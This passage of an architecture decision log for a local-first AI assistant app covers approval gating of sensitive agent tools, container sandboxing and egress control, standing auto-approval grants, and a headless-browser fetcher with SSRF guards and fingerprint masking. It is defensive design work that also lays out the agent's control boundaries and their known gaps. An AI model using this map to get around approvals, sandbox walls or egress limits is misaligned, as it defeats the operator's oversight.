  - **As built — brute-force hybrid in Python, *no* `sqlite-vec` (revised).** `sqlite-vec`'s whole justification was that whole-DB SQLCipher would encrypt its vectors "for free" (this entry's own phrasing). D17 moved to **app-layer per-column AEAD** (no portable SQLCipher wheels), and that premise is gone: `sqlite-vec` does KNN over **plaintext** vectors, which under per-column encryption would leave embeddings of private memories unencrypted at rest — and embeddings are invertible enough to leak their source text, contradicting `XC-SEC-3`. (FTS5 keyword indexing has the same plaintext-index problem.) So at single-operator volumes the store is **brute-force-in-Python over the decrypted working set**: vectors are AEAD-sealed in their column, and recall loads the owner's memories, decrypts, and scores each both ways — **dense** (cosine over embeddings, "by meaning") and **sparse** (token overlap, the keyword path) — fusing the two with **Reciprocal Rank Fusion**. This satisfies `MEM-2` (meaning + keyword fallback) in one pass, keeps every vector encrypted, needs **no native extension** (better for `XC-PORT-1`), and is microseconds at this scale. `EMB-2` is honored: dense comparison is gated to the same embedding model/dim, so a model change degrades to sparse rather than comparing across spaces. **The pluggable seam stands** — an ANN store (`sqlite-vec`/external) can slot back in when *volume*, not confidentiality, becomes the constraint, which is an explicit trade then (and would pair with whole-DB encryption if it returns). First realized for `MEM-*`; `RAG-*` reuses the same store.

- **D19 — Deep-research build approach (`DR-*`) 🟢 DECIDED: hybrid.** A **hand-coded outer pipeline** owns the deterministic concerns — rounds + time bounds (`DR-3.1`), source/query dedup (`DR-1.4`), per-round concurrency and source caps (`DR-3.4`), stop-when-comprehensive (`DR-3.2`), and the phase progress events (`DR-5.1`). Inside each round, a **Pydantic AI agent** handles the judgement-heavy step: analyze gathered evidence, refine the evolving answer, and identify remaining gaps to investigate next (`DR-1.2`). Both ride the **Run substrate** and reuse the **search + LLM capabilities** directly. This keeps the bounds explicit and testable while letting the model do the open-ended synthesis. Cost: two paradigms in one feature — kept clean by the pipeline owning control flow and the agent owning only the in-round reasoning.
  - **As built — `research/` (pipeline core) + `routes/research.py` (the product wiring).** The library/route split holds exactly as decided: `research/pipeline.py`'s `run_research` is pure — a plan and a question in, a report out, no routes/model-resolution/Run wiring — and everything that turns it into a product feature lives in `routes/research.py`, which builds an `Orchestrator` closure around it and submits that as an ordinary Run.
    - **Fan-out is dynamic, not a fixed per-phase agent count.** Within a round's `searching`/`reading` phases, the number of concurrent workers scales to that round's actual workload (fresh queries, hits worth reading) capped by `research_max_concurrency` — never a hardcoded N. A worker's own failure (a dead search provider, an unfetchable page) is swallowed inside that worker; it loses only its query/source, never the round (`DR-4.2`).
    - **Pre-run clarify/refine is plain REST, deliberately never a parked Run.** `POST /research/intake` and `POST /research/{id}/refine` are two small, one-shot Pydantic AI calls made directly from `routes/research.py` (a utility-model clarify judge, a main-model planner) — lightweight enough that parking them on the Run substrate would be needless ceremony. Only the frozen, operator-approved plan becomes a Run, at `POST /research/{id}/start`. `refine` called with neither `answers` nor `feedback` is the mandated skip/start-now affordance (`DR-1.6`) — it forces straight to a plan without a second clarify round.
    - **Phases map onto the existing, frozen event vocabulary — no new event types.** Each pipeline phase (planning/searching/reading/analyzing/writing) is one `step.started`/`step.completed` pair; a newly-used source lands a `citation.added` (also the report's `[n]` numbering); once per round, `tool.progress` carries cumulative run-wide "N sources, M findings"; the `DR-4.1` two-consecutive-empty-rounds abort is a `limit.notice` immediately followed by the run ending in `error` with that message verbatim. `runs/events/` was not touched.
    - **Report persistence is decoupled from the orchestrator's own task.** `start` registers a waiter future for the Run's id (the same `app.state.*_run_waiters` shape the scheduler's agent-task executor already uses) and a background task awaits genuine Run-terminal before writing the finished report/stats/status — so a cancellation mid-write can't corrupt the persisted row. "Continue in chat" (`DR-1.5`/`DR-7.3`) reuses `ConversationStore.record` verbatim (a synthetic user-prompt/report exchange seeds the new conversation) rather than inventing a document-attachment seam; a repeat call is idempotent off `ResearchRun.conversation_id` already being set.
    - **Notifications get their own policy branch, not a bolt-on.** Research runs are conversation-less, so D30's conversation-linked emit policy doesn't apply; `_notify_run_terminal` branches on `run.kind == "research"` and fires `run_completed`/`run_failed` unconditionally (never subscriber-gated — a multi-minute run finishing is worth knowing about even mid-tab), carrying a new nullable `research_id` (additive column on `Notification`, threaded through the same D30 machinery) that deep-links back to the research entry.

- **D20 — Sensitive-capability gating 🟢 DECIDED: approval via Pydantic AI deferred tools.** Sensitive tools (Axis B in D14) are gated by **explicit user approval**, implemented with Pydantic AI's human-in-the-loop deferred-tools mechanism:
  - A sensitive tool is marked `requires_approval=True` (or raises `ApprovalRequired` for runtime-conditional sensitivity — e.g. a write to a protected path).
  - The agent run ends with a `DeferredToolRequests` output whose `approvals` list holds each pending `ToolCallPart` (tool name + **validated args** + `tool_call_id`). Pydantic AI has done the agentic work; it has *not* executed the call.
  - **We own the pause/resume lifecycle:** the Run enters an `awaiting_input` state; we emit an `approval_required` event (carrying the human-readable action + args) over the stream; we notify on the appropriate channel (inline for an interactive Run; push/email for an unattended/scheduled Run); we hold the serialized message history.
  - The user decides via a `POST /runs/{id}/approve` control endpoint. We resume the agent with `deferred_tool_results=DeferredToolResults(approvals={tool_call_id: ToolApproved() | ToolDenied(message=…)})`. `ToolApproved` may carry `override_args`; `ToolDenied`'s message is shown to the model so it can adapt.
  - Because the parked state is just serialized history + pending requests, an approval pause **naturally survives client disconnect** (`AE-7`) and can outlive it entirely for unattended runs.

  This unifies interactive and unattended gating under one mechanism (only the notification channel and latency differ) and keeps the clean split: Pydantic AI decides *what* needs approval and *exactly what it would do*; we own *parking, notifying, waiting, and resuming*.

- **D21 — Document streaming & auto-promotion (`AE-6.2`, `AE-6.4`, `DOC-3`).** How AI-authored document content streams into a version and commits, and how a substantial inline code/doc block gets *promoted* into a real document automatically. Detection heuristic + event shape. **Defer until the document feature is in scope.**

- **D22 — Upload ingestion / extraction pipeline (`UP-*`, `RAG-4`) 🟢 DECIDED: a pluggable extractor seam, MinerU-in-front with a built-in floor.** An uploaded file is stored sealed (bytes + filename + extracted text), and its *contents* are made usable by extracting a text layer off the request path on a lock-aware worker, then chunked into the shared corpus so the agent retrieves it via `corpus.retrieve` (`services/uploads` + `services/corpus/uploads`, mirroring documents). Duplicate recognition is a content `sha256` (`UP-1`); the upload endpoint is rate-limited (`UP-4`, `core/ratelimit`).
  - **Extraction is a seam (`UploadExtractor`), not one path.** The **built-in** `BasicExtractor` is the zero-setup floor: pypdfium2 pulls native PDF text, and a page with no text layer (scanned/image-only) is rasterized and sent to a **vision model** for OCR — the codebase's first multimodal model call, kept in the engine layer (`agent/vision.py`) behind a narrow `VisionOCR` seam so the services-layer extractor never imports the engine (the registry resolves a vision-capable endpoint; absent ⇒ the page comes back empty *with a reason*, an actionable error the operator can retry). **MinerU** (`services/upload_mineru`) is the high-fidelity path — layout, tables, formulas → clean Markdown — and is **detected, not bundled**: like the container runtime and SearXNG it's a host capability found with `shutil.which` and shelled out to, so the project venv never pulls its PyTorch stack. It runs as a **transient subprocess** (models load per-extraction, freed on exit — lazy + auto-offload by construction). `FallbackExtractor` puts MinerU in front of the built-in and degrades to it on *any* failure (missing, OOM, timeout), matching the fail-soft posture. The producing extractor (`basic`/`mineru`/`manual`) is recorded on each upload so a built-in extraction is identifiable and re-runnable for higher fidelity — and since the original bytes are retained sealed for the upload's lifetime, that re-run reads from the same source (a labelled `retry`).
  - **Deferred.** `UP-3` fillable-form detection; the chat-attachment path (a turn's inline file/link context, `CHAT-2`) reuses this extraction but its wiring lands with chat attachments.

- **D26 — Extraction/model resource governor (`UP-*`, `COOK-*`) 🟠 DEFERRED: documented, not built.** MinerU's models and the operator's LLM compete for the same host memory/VRAM. Today this is sidestepped by running MinerU as a **transient subprocess** (D22) — its models exist only during an extraction and are freed on exit, so co-residency is bounded by construction and needs no governor for correctness; on the target unified-memory hardware (128 GB Apple Silicon) contention rarely binds. The governor is the *performance* layer for when it does:
  - **Warm + reap.** Optionally keep a MinerU server warm for fast repeat extractions, lazily loaded on first use and offloaded after an idle TTL — the **sandbox-session reaper pattern** (D23) applied to an extraction model.
  - **Headroom-aware scheduling.** Extend the Cookbook's host hardware detection (`COOK-*`) with the extraction pipeline's footprint and live free headroom, to decide whether MinerU and a model can co-reside, and to **serialize** heavy jobs under pressure.
  - **Extraction precedence — bounded by what we own.** Under genuine pressure an upload extraction should win. We can stop/reload a **locally-served** model (the system owns its lifecycle — `model serve/stop` is already a sensitive action) to free room; we **cannot** evict a **remote** endpoint (another host, not ours) — there it's pure contention or none. So "extraction takes precedence" means: prioritize extraction in a host-resource scheduler and, where the model is locally served, free it; never claim to evict what we don't control.

- **D23 — Code-execution isolation (`XC-SEC-7`, `AE-2`, `AE-3`) 🟢 DECIDED: sandboxed by default, host only via explained approval.** Approval (D20) is *consent, not containment* — a misjudged click, a destructive command dressed up as benign, or injection that manufactures a plausible approval request all land on the real host. So code execution gets a structural boundary *underneath* the gate, not just the gate.
  - **Invariant.** All agent-invoked code and shell execution runs in an environment **isolated from the host**, operating only on **copies** of the files explicitly handed to it. It cannot read or modify the host filesystem, processes, or environment. Outputs return to the user/app explicitly; any write-back to real data is an ordinary, separately-gated action — nothing escapes the box as a side effect.
  - **Two paths, cleanly split.** (a) **Sandboxed execution** is the default and is *not* approval-gated — being contained, it carries no host-level risk, so the agent computes freely in the box (and routine code-exec loses its approval friction entirely). (b) **Host execution** is a distinct, **approval-gated deferred tool** (reusing D20's mechanism) for the legitimate case where the user genuinely needs the host itself changed; its approval request MUST carry a **plain-language explanation** of what the code does and its effect, not just the raw command (`AE-3.4`).
  - **Operator's own terminal stays.** The manual Host Shell (`SHELL-*`) is operator-initiated — the operator deliberately operating their own machine — and is unchanged by this; the agent can never reach it. The agent's only path to the host is the explained-approval tool above.
  - **Mechanism — pluggable, container default.** An **execution-sandbox capability** in `services/` with a pluggable backend; default is a **container runtime** (Docker/Podman) providing filesystem/process/network isolation and copy-in/copy-out of files. Provider-agnostic like the vector store (D18); the container runtime is the portable default that satisfies `XC-PORT-1` (works across Linux/macOS/Windows, no OS-specific facility).
  - **Degradation — fail closed, never to host.** If no sandbox runtime is available, the code-execution capability is **disabled** and the agent is told so (`XC-DEG-*`); it MUST NOT silently fall back to running on the host. Network egress from the sandbox is off/controlled by default so copied data can't leak; tighten per config.
  - **Ripples.** The `approval.required` event gains an optional explanation field for the host-exec case (additive to the frozen v1 protocol, D15 — no version bump). `RUN-1`'s in-browser snippet runner already honors the spirit (never on host) and is unaffected. `SHELL-*` is reframed to the operator's own deliberate terminal — agent-unreachable, opened only through a re-authenticated **host mode** (`SHELL-3`).
  - **As built — `services/sandbox/` + the `code` toolset.** The capability is a package: `base` (the `Sandbox` ABC + `SandboxSpec`/`SandboxResult`/`SandboxFile` value types + `SandboxError`), `container` (the default `ContainerSandbox` backend), `host` (the deliberate non-sandboxed escape hatch), and `detect` (the fail-closed factory). `ContainerSandbox` drives the Docker/Podman CLI over `asyncio` subprocesses (no SDK dep — keeps the dependency surface small and portable): each run is a throwaway container with `--network none` (egress off unless asked), `--cap-drop ALL`, `--security-opt no-new-privileges`, a read-only root with a writable `/work` bind-mount + small tmpfs, and explicit memory/CPU/PID caps; only `spec.env` reaches the process (the host env never leaks). Copy-in/out is a host-side temp dir mounted at `/work` (the controlled copy area — the operator's real files are never mounted), with a `../`-escape guard. `detect_sandbox` probes the runtime once at startup and returns `None` when none is present or the operator disabled it (`sandbox_enabled`) — the capability is then **absent**, never a host fallback. The handle lives on `app.state.sandbox`, threads through the chat/resume orchestrators onto `RunDeps.sandbox_sessions`, and is reached by the `code` toolset: `execute_code` (sandboxed `python`/`bash`, **not** approval-gated; reports "unavailable" and refuses to run when no runtime) and `run_host_command` (the host path, `requires_approval=True`, taking a `command` + a plain-language `explanation`). The engine lifts any approval tool's `explanation` argument into the new optional `ApprovalRequired.explanation` field so the operator sees it as a distinct field, not buried in raw args.
    - **Continuity — a per-conversation live session (`session`).** Rather than a throwaway container per call, the `code` toolset reaches a `SandboxSessionManager` that keys one live container to the conversation, **lazily** created on the first execution and kept warm so the agent can iterate against the same process and filesystem (fix-and-rerun, reuse a just-installed dependency) without rebuilding. A background reaper kills a session idle past `sandbox_session_idle_ttl_s`. Files survive the reap: the workspace is a host-side dir bind-mounted into the container, and the reap does not touch it. *(Superseded in part by **D98**, which is where the sealing this bullet originally described was removed — it was encrypting the workspace at rest at the cost of silently dropping the agent's dependencies, build output and git history on every reap.)* Egress stays off-by-default without a fragile live toggle: ordinary calls `exec` into the no-network session container; a `network=True` call runs as a one-shot `--network bridge` container over the *same* workspace, so a fetched package lands in files the session then sees. This live-process foundation is also what later enables previewing an agent-run server or generated artifact in the frontend. Pre-authorization (D24) has since landed with the task scheduler; the external-tool trust allowlist (D25) is **not** built yet — it lands with MCP/INTEG.
    - **⚠️ Superseded in part by D78 — the walls, not the invariant.** The read-only root, `--network none` for session work, "egress off unless asked" and the `network=True` one-shot bridge container are all gone: a session now sits on its own `--internal` network whose single exit is an allowlisting proxy sidecar, and the widening tool (`code_request_egress`) is approved per call. The invariant this entry exists for — copies only, the operator's real files never mounted, no host env, fail-closed detection, host execution separately approval-gated — is unchanged.

- **D24 — Pre-authorized scheduled tasks (`AE-3.5`, `TASK-*`) 🟢 DECIDED: approval moves to scheduling time as a scoped standing grant.** Strict per-run approval (`AE-3.2`) makes a recurring task that touches a sensitive action **park every run** — defeating the point of unattended automation. Resolution: **the scheduling tool is itself a deferred/approval tool** (D20). When the agent schedules a task, the Run parks and surfaces the task to the operator — its trigger, intended actions, and the specific **sensitive actions** it would perform — and approval grants a **scoped pre-authorization** stored with the task.
  - **At each unattended run.** A sensitive action **within** the pre-authorized scope is auto-satisfied (the deferred result is supplied as approved) without re-parking; a sensitive action **outside** the scope falls back to `AE-3.2` (pause + notify). The standing-trust surface is bounded to exactly what the operator reviewed.
  - **Scope, not a blank cheque.** The pre-authorization is over a **declared scope** (e.g. 'may send email to these recipients', 'may run sandboxed code', 'may not run host code'), checked at runtime — not an unconditional pass. For free-form agent tasks whose exact calls aren't known at scheduling time, the operator approves the *bounds* and runtime actions are matched against them; an out-of-bounds action pauses.
  - **Revocable & visible.** The operator can review and revoke any task's pre-authorization at any time; revocation returns the task to strict per-run approval. Ties D13 (the scheduler materializes tasks as Runs) to D20 (the deferred-tool approval mechanism), reusing both rather than adding new machinery.
  - **As built — the scope rides D28's conversation-grant mechanism, not a parallel one.** `ScheduledTask.pre_authorized` (`list[str]`, stored in the clear — policy, not content, like `ApprovalGrant.tool_name`) reuses the exact tool-name vocabulary `AE-3.7`'s conversation grants already use, validated on write (`routes/tasks.py`'s `_validate_pre_authorized`; an unknown scope value is rejected on create/patch, never silently dropped). At each execution the scheduler's composed executor seeds a fresh conversation grant from that scope with a TTL covering the run, so `agent/engine`'s existing D28 auto-approve split is what actually satisfies an in-scope deferred call — no second approval code path exists. A sensitive action outside the scope falls through that same split to a strict park (an `approval_needed` notification, identical to an interactive run) — verified end-to-end by `test_task_run_hitting_sensitive_tool_outside_grants_parks_and_notifies`. Revocation is just editing `preAuthorized` via `PATCH /tasks/{id}` (no separate revoke endpoint); the next execution seeds from the edited scope. The unattended-run notification channel for a task's outcome (`TASK-6`) is **in-app only in v1** — email/push are deferred (see D30).

- **D25 — External-tool gating (`AE-3.6`, `MCP-*`, `INTEG-*`) 🟢 DECIDED: sensitive by default, operator trust opt-out.** The `AE-3` sensitivity model rests on a *known* list (shell, email, vault…); tools from registered MCP servers and configured third-party integrations are the **unknown** case it can't enumerate — arbitrary, possibly externally-visible effects. So they are **approval-gated by default**, and the operator opts specific tools into **trusted** (auto-approve) status. Consistent with the rest of the posture (sandbox-by-default, explain-before-host): unknowns are contained until the operator deliberately relaxes them, per tool, never the agent.
  - **Mechanism.** In the toolset stack, external tools carry a default *sensitive* marking and ride the same deferred-tool approval path as D20; a **trusted-tool allowlist** (operator-managed, persisted in encrypted settings) flips specific tools to auto-approve. Enable/disable (`AE-3.3`) is orthogonal and still applies.
  - **Scope.** Trust is **per tool, not per server**, so registering/enabling a server doesn't blanket-trust everything it exposes. Revocable at any time.

- **D27 — Web page fetch (`SEARCH-2`, `DR-*`) 🟢 DECIDED: always-render in a containerized headless browser, extract with trafilatura.** The agent's `fetch` capability was a static `httpx` GET + trafilatura. A static GET never runs JavaScript, so SPAs and client-rendered pages came back empty — a direct failure of "read what's on the page." A "static-first, retry with a browser if thin" tier was rejected: reliably *detecting* an incomplete static extract is an unreliable heuristic. So the **open web is treated as always-dynamic** — every fetch renders the page in a real browser, then the rendered DOM is extracted. Lives in its own capability, `services/webfetch/` (browser · guard · extract · stealth · fetcher), separate from `services/search` (SearXNG).
  - **Engine — in-process-driven, but the browser is containerized.** Firecrawl was evaluated and declined: self-hosted it adds only a headless browser behind a heavy Node/Redis/Postgres stack with an un-tunable, historically-buggy SSRF guard (AGPL); cloud-hosted it breaks the local-first posture (egress + key + cost) and is the only tier with real anti-bot/proxy reach. We render with **Playwright driving a headless Chromium that runs in its own loopback-bound container** (the same Docker/Podman runtime as the sandbox and SearXNG), connected over the **Chrome DevTools Protocol** (`connect_over_cdp`). Rendering executes *untrusted page JavaScript*, so it must not run in the backend process; the container isolates it, and the container's separate network namespace means even an SSRF-guard bypass (a timed DNS rebind) can't reach the host's own loopback services. CDP is version-tolerant, so the image tracks **`:latest`** (refreshed each boot by the shared `ensure_image`, like SearXNG) without being pinned to the Python client's Playwright version — and there is **no local browser binary to install**. Bring-up mirrors `ManagedSearxng`: best-effort, non-fatal, background; absent a runtime/image the capability degrades, never blocking startup.
  - **Extraction — trafilatura is the extractor, not the fetcher.** Independent benchmarks put trafilatura first among open-source main-content extractors; it runs over the rendered HTML string, emits Markdown natively (tables/links/code), and internally cascades (its heuristics → readability-lxml → jusText). The earlier sketch of Readability.js + a Markdown converter was dropped: Readability flattens tables and is weaker on structured pages, and trafilatura's native Markdown removes the converter. When trafilatura returns nothing usable, the page's rendered `innerText` is the fallback — a genuinely different failure mode (non-prose pages) that guarantees non-empty output when visible text exists. LLM-based extractors (Jina ReaderLM) were rejected: slower, costlier, and not more accurate per current benchmarks.
  - **SSRF — every request, not just the entry URL.** The entry URL is pre-flighted with `core.ssrf.assert_public_url`; then a `page.route` handler re-runs the **same** guard on every request the browser makes — main document, redirects, and subresources — reusing the existing primitive rather than re-deriving it. A blocked main-frame navigation is a hard refusal (`SSRFError`) on every code path; subresource blocks are silent. `data:`/`blob:`/`about:` are in-memory and allowed; any other non-http(s) scheme is refused. Strictly stronger than the old manual per-redirect-hop loop.
  - **Stealth — present as a normal user's browser.** A headless automated browser leaks tells (`HeadlessChrome` UA, `navigator.webdriver`, empty plugins, a SwiftShader WebGL renderer) that make sites serve bot/blocked/stripped content, so the agent wouldn't see what a person sees. Each context gets a realistic UA (matched to the engine version), a normal locale/timezone/viewport/Accept-Language, and an init script masking those tells. This is **fingerprint normalization, not anti-bot evasion** — it gets ordinary sites to return real content; it does *not* defeat residential-proxy/CAPTCHA walls (the cloud tier we declined).
  - **Container hardening.** The browser container runs untrusted code, so it is hardened like the sandbox: `--cap-drop ALL`, `--security-opt no-new-privileges`, a **read-only root** with a tmpfs for Chromium's only writable path, memory/PID/shm caps, loopback-only published CDP port. It runs as container-root (the image is built for it) with all capabilities dropped.
  - **Deferred follow-ups (documented, not built).** (a) **Shared managed-container base.** `ManagedBrowser` and `ManagedSearxng` now duplicate the "managed loopback container with best-effort background bring-up" lifecycle (start/stop/`_bring_up`/`_flags`), and the two flag sets have already begun to drift. The right altitude is a shared `ManagedContainer` base in `services/sandbox` owning the lifecycle, with each as a thin specialization supplying image/name/flags + a readiness hook — deferred because it touches the landed SearXNG path. (b) **Egress-level SSRF defense-in-depth.** The per-request route guard remains TOCTOU-exposed to a timed DNS rebind (the connect re-resolves independently); the container netns already prevents reaching host loopback, but the `--network bridge` container can still egress to the LAN/metadata endpoint. Dropping private CIDRs at the container's egress (a filtering resolver / an allowlisted proxy) would make the in-process guard defense-in-depth rather than the sole boundary.

- **D28 — Conversation-scoped auto-approval grants + gating global knowledge-base recall (`AE-3`) 🟢 DECIDED: a generic, operator-opt-in standing grant over the deferred-tool mechanism, off by default.** Two operator-driven additions to the approval surface (D20), built once as a tool-agnostic layer:
  - **Global corpus recall is now an approval gate — a *context* gate, not a *security* one.** `corpus.retrieve` pulls untrusted knowledge-base content (folders/memory/conversations/uploads) into the model's context; when the agent judges the KB relevant but the operator knows it isn't, the operator should be able to keep that content out of the window. So **global recall** (no `source_ids`) is gated by raising `ApprovalRequired` — a *conditional* gate (D20's runtime-conditional path), so an **explicit-id read** (a file the operator just attached, whose id rides in the attachment marker) passes straight through; gating a file the operator deliberately provided would be pure friction. A denial returns `ToolDenied` and the retrieval never runs, so nothing reaches context. This is deliberately **outside** the `AE-3.1` sensitive-action set (it is read-only, no host effect) — it is the first gate motivated by *context hygiene* rather than irreversibility, and the spec marks it as such.
  - **A conversation-scoped, time-limited, revocable auto-approval grant.** Re-prompting for the *same* deferred call across a long run is the friction `AE-3.5` already solved for scheduled tasks; this is the interactive analogue. When the operator approves a deferred call they may opt into "allow for the rest of this conversation" (the affordance **appears on every** deferred approval but is **off by default** — the strict per-call default is unchanged). A grant is keyed `(owner, conversation, tool)`, carries a **TTL** (`approval_grant_ttl_s`, default 24h), and is **visible + revocable** on the conversation. While a grant is active the engine resolves that tool's deferred requests itself — `DeferredToolResults(approvals={…: ToolApproved()})` — without an operator round-trip; the tool still streams its normal `tool.started/completed` events, so an auto-approved call stays visible in the transcript.
  - **Eligibility — any gated tool, by the operator's explicit choice.** Unlike `AE-3.5` (scoped to the *specific* sensitive actions a task declares) and `D25` (per-tool trust for *external* tools only), this grant can cover **any** deferred tool, including `AE-3.1` sensitive actions such as host execution. This is a deliberate **relaxation of `AE-3.1`'s strict per-call rule for sensitive actions**, made on the single operator's instruction and bounded three ways: it is **opt-in** (never defaulted on), **conversation-scoped** (never global), and **time-limited + revocable**. The security trade-off is real — a standing grant for host execution auto-runs further host commands in that thread until it lapses or is revoked — and is accepted here because the operator chose it knowingly; the bounds keep the blast radius to one conversation for one day. `AE-3.1`/`AE-3.7` are edited in place to reflect this.
  - **As built — one mechanism, both sides.** Backend: a persisted `ApprovalGrant` (owner seam, no sealing — it is policy, not content) + an `ApprovalGrantStore` (grant/active/list/revoke, TTL-filtered) on `app.state`; one central split in the engine's `DeferredToolRequests` branch (auto-approve the granted calls — resume inline when *all* are granted, else park only the rest with the auto ones pre-filled and merged on resume); `ApprovalDecision.scope` on `POST /runs/{id}/approve` records the grant; `GET`/`DELETE /conversations/{id}/grants` for the visible/revocable list. Frontend: one opt-in checkbox on the shared `ApprovalCard` (renders for every deferred call) + a revocable grants strip on the conversation. No per-tool work beyond marking `corpus.retrieve`'s global path.

- **D29 — Unify artifacts + live previews into one versioned "View" 🟢 DECIDED: one tool, one surface; head = live server, history = snapshots.** The agent had two ways to show its output — `publish_artifact` (a frozen file snapshot, encrypted + served inert) and `start_preview`/`stop_preview` (a live reverse-proxied server) — exposed as two tools, two event types, and two inline UI panels. That split is a *mechanism* (a frozen file vs. a running process) leaking out as if it were two products: it confused the model into double-showing the same page (serve it live *and* re-publish it as an artifact), and the live preview pointed at the server root, so `python -m http.server` with no `index.html` rendered a **directory listing** instead of the page. The operator's framing collapses them: the useful things are **a live view of the current thing** and **the ability to flip back through previous versions to compare**. Those are the **head** and the **history** of one surface — and crucially a live server has *no* history, so the comparable timeline can only be snapshots. So artifacts aren't a rival feature; they are the versioning mechanism for the one **View**.
  - **One capability, two mechanisms underneath.** A single `view` toolset: `view_show(file=…)` captures a static **version** (reusing `services/artifacts` as the version store — no schema change) and emits `view.version`; `view_show(serve=…, port=…, path=…)` runs the live **head** (reusing `services/sandbox` + the `/previews/{token}/` proxy) and emits `view.live`; `view_close` emits `view.live.stopped`. Exactly one of `file`/`serve` per call (else `ModelRetry`). The model now reasons about one thing, so the redundant double-show goes away.
  - **The directory-listing fix falls out of the unification.** `view_show(serve=…)` takes an optional `path` (the entry file) and bakes it into the proxied url (`/previews/{token}/<entry>`), so the live head renders the page, not the autoindex. The frontend renders the url verbatim — no client logic.
  - **One UI surface.** The transcript shows compact **chips** where the View changed (a version added, the live head started); the heavy render moves to the **viewport** beside the conversation — the current item on stage plus a version timeline to flip back and compare. The viewport auto-opens the first time a thread produces a View item, then respects a manual close (first-time-only, per thread). Cold reads re-attach static versions to their message (warm/cold parity); a stopped live head isn't re-openable, by nature.
  - **Scope of the rename.** The *product surface* unifies — tool (`view_show`/`view_close`), events (`view.version`/`view.live`/`view.live.stopped`), REST (`/views/*`), and frontend vocabulary. The internal `Artifact` table + `ArtifactStore` stay as the version store (the snapshots are already sealed + `created_at`-ordered, so no migration), and the security-sensitive token-credentialed live proxy stays at `/previews/{token}/`. Deferred: side-by-side version diff, search/filter in the viewport, persisting a live head across session reaps.
  - **🔧 REVISED — `show` anchors the version; one version per show, not two systems.** D29 left *two* version mechanisms racing: `view_show(file=)` minted an **artifact** version mid-turn (`view.version`), while the later-added git-style **workspace-history** store (`services/workspace_history`, `view.snapshot`) blindly captured the whole sandbox tree at *end-of-turn* — so a turn that both showed a result and wrote a file produced two disjoint "versions" the UI couldn't reconcile (e.g. a plot image artifact + a code-only snapshot of the generator script, the latter stealing focus and rendering "NO PREVIEW"). The fix collapses them: **a version IS a workspace snapshot, and `show` is the sole creator of versions and the anchor of each version's preview.** `view_show(file=)` captures the workspace tree (the version's *code*) and stamps a **preview descriptor** (`preview_artifact_id` + `preview_kind`) pointing at the shown file's bytes (still the artifact store, now purely *preview bytes*, not a rival version); `view_show(serve=)` captures a version with a live/auto preview overlaid by the head. The blind end-of-turn auto-capture (`agent/engine._capture_workspace_snapshot`) and the `view.version` event are **removed**; `view.snapshot` carries the preview descriptor and is the one version event. Consequence (intended): turns that change files but never `show` are no longer versioned — the git-style history is now anchored to *what was shown*, not every turn. Known limit: a live head's CODE is frozen at show-time until the next `show`.

- **D30 — Attention/notification surface (`AE-3.2`) 🟢 DECIDED: a second, separately-versioned SSE surface; subscriber-count-gated completion notices; write-behind persistence via an injected terminal hook.** `AE-3.2` needs the operator to learn about approvals, failures, and completions while roaming the app or away entirely — a durable, cross-conversation concern the frozen per-run protocol (D15) was never shaped for: that stream is per-run, in-memory-only, and dies with its run, so a run the operator wasn't attached to leaves no trace once it ends.
  - **A new surface, not a new event on the old one.** Rather than extend the run union, notifications get their **own** REST + SSE surface (`routes/notifications.py`, `services/notifications.py`, `models/notification.py`) with its **own** versioned envelope (`notification.created`/`notification.updated`) and its **own** in-memory ring buffer keyed by a **per-process** `seq` — deliberately mirroring the run transport's framing (`id:` seq, flat JSON `data:`, `Last-Event-ID` resume, ~15s keepalive) rather than sharing its buffer, registry, or lifetime. Cost: two SSE stacks with parallel-but-separate reconnect/replay logic instead of one generalized transport. Accepted because the run union is explicitly frozen (D15) and because the two have genuinely different lifetimes — a run's buffer dies with the run; the notification ring buffer lives for the process and is separately backed by the DB for real history (REST `GET /notifications` backfill), which no per-run stream needs.
  - **`run_completed` is gated on subscriber count, not on any explicit "did the operator see this" signal.** A run that finishes while nobody is attached to its own event stream is the case `AE-3.2`'s "pause unattended" is really about; a run finishing while the operator is watching it stream in real time needs no separate notification — they already saw it. The registry's injected `on_terminal` hook captures `run.stream.subscriber_count > 0` **synchronously, at the terminal transition**, before scheduling the (async) notify task — reading it later, from inside the scheduled task, would race the stream's own subscriber cleanup and could observe a stale count. `approval_needed` and `run_failed` have no such gate: an approval always needs a decision and a failure is always worth surfacing, watched or not. `limit.notice`/`context.window` are deliberately never notifications — in-band-only signals, not attention-worthy on their own.
  - **`runs/` stays free of a `services/` import via one injected callback.** The layer rule (`routes → agent/research → tools → services → core`, `runs/` as the substrate underneath all of it) would break if the registry reached up into `services/notifications` directly. Instead `RunRegistry` takes an optional `on_terminal: Callable[[Run], None]` at construction — synchronous, best-effort, swallowing its own exceptions so a notification failure can never affect a run's own recorded outcome — and `app.py` supplies the closure that does the actual `services/` work (resolve the linked notification, then notify per the policy above). The registry only ever knows it holds an optional callback; the composition lives in the assembly layer where both sides are already visible.
  - **Persistence rides the same write-behind discipline as conversations (D8), as its own drainer instance.** `NotificationService` owns a second `WriteBehindWorker` (`core/worker.py` — the same lock-aware drainer conversations use, not a shared instance) so a locked vault parks a pending write instead of losing it, and title/body encryption happens only in the drainer, off the request/emit path. Read/resolve mutations ride the same queue as creation, so ordering between "created" and "resolved elsewhere" is preserved without a separate mutation path.
  - **Auto-resolution is multi-path by construction.** An `approval_needed` notification's `resolved_at` is set whichever way the underlying approval is actually settled — the approve route, a deny, a conversation-grant short-circuit (D28), or (the backstop) the run simply reaching terminal with the approval never decided (e.g. cancelled while parked). The terminal hook always calls `resolve_for_run` first, unconditionally, before considering whether to also emit a completion/failure notice — so a dangling `approval_needed` can never survive its run.
  - **Encryption granularity matches the rest of the app (D17), not a stronger or weaker posture.** `title`/`body` are the content and are AEAD-sealed per column; `kind`, the `conversation_id`/`run_id`/`task_id` links, and timestamps stay structural/plaintext so the DB can index, order, and filter (`unread_only`, pagination) without decrypting rows just to list them — the same trade-off already made for conversations and documents. `task_id` was a nullable forward-compat seam at this decision's writing and is no longer unwritten: the task scheduler (D13) now stamps it on every `reminder` and `task_outcome` notification (`app.py`'s `_task_notify`/`_task_executor` closures), the same way the research surface (D19) stamps the analogous `research_id`.

- **D31 — Operator Shell transport + re-auth (`SHELL-1..3`, `RUN-1`) 🟢 DECIDED: WebSocket for the PTY, a short-TTL single-use host-mode token as first-message auth.** Two builds landed together — the operator's own host terminal and the in-browser code runner — each resolving a different question the house patterns (D1's SSE+POST, D20's approval) don't answer cleanly.
